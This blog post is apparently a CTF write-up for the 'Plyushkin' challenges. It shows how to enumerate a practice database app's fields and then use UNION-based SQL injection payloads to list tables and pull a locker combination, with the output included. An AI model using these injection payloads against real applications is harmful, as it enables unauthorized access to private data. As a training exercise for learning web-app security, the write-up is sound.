---
layout: post
title:  "5Charlie CTF - Plyushkin"
date:   2020-06-26 00:00:00 -0500
categories: write-up
tags: [ctf, write-up, linux, database, hacking, sqli]
---

## Plyushkin 1

### Plyushkin 1 - Challenge

To access this challenge, ssh to plyushkin@haxor.5charlie.com using the attached private key.

Log in to the application with username: plyushkin and password: Petrushka12.

What fields are available to search? (arrange in alphabetical order in format: afield,bfield,cfield)

NOTE: Ignore these two lines in the program output:
Here's the clue you were supposed to get:
Bobert, put something useful or useless here
They aren't a hint, white cell just didn't feel like recompiling ;)

**Attachments:** `id_plyushkin` - SSH Key

### Plyushkin 1 - Solution

We start out by connecting to the application with the given credentials and giving a blank input.

``` text
Password: Connecting to database...
Creating table in given database...
Created table in given database...
Inserting records...
System ready
Field to search on:
Invalid field, please enter: id, first, last, or age
```

**Flag:** `age,first,id,last`

I noticed a lot of people complaining about it not taking the flag.
I actually failed on my first input too. We just need to read better:

> (arrange in alphabetical order in format: afield,bfield,cfield)

'age' comes before 'first'. Doh!

## Plyushkin 2

### Plyushkin 2 - Challenge

What is the name of the table this program was designed to query?

### Plyushkin 2 - Solution

We can guess based upon the fields in the previous challenge that we're evaluating some sort of employee records database.
We could probably guess-check our way to the answer, but after playing with different inputs, it appears the application is vulnerable to SQL injection.
We are able to pull the names of tables by using an SQL UNION and querying the database tables that store information about the tables in the database.

{% highlight sql %}
6' OR 1=1 UNION SELECT 0,table_schema,table_name,0 FROM information_schema.tables;--
{% endhighlight %}

``` text
Age: 0
ID: 0
First Name: PUBLIC
Last Name: LOCKERS
Age: 0
ID: 0

First Name: PUBLIC
Last Name: PERSONNEL
Age: 0
ID: 0
```

**Flag:** `PERSONNEL`

## Plyushkin 3

### Plyushkin 3 - Challenge

What is Nikolai Gogol's locker combination? (format: ##-##-##)

### Plyushkin 3 - Solution

Looking again at the previous question, we can note that we already have the info on the table we're targering.
At this point we just need to contruct an SQL injection query to pull the combination.

{% highlight sql %}
6' OR 1=1 UNION SELECT 0,combination,combination,0 FROM public.lockers;--
{% endhighlight %}

``` text
ID: 0
First Name: 18-44-9
Last Name: 18-44-9
Age: 0
ID: 6
First Name: Nikolai
Last Name: Gogol
Age: 26
```

**Flag:** `18-44-9`
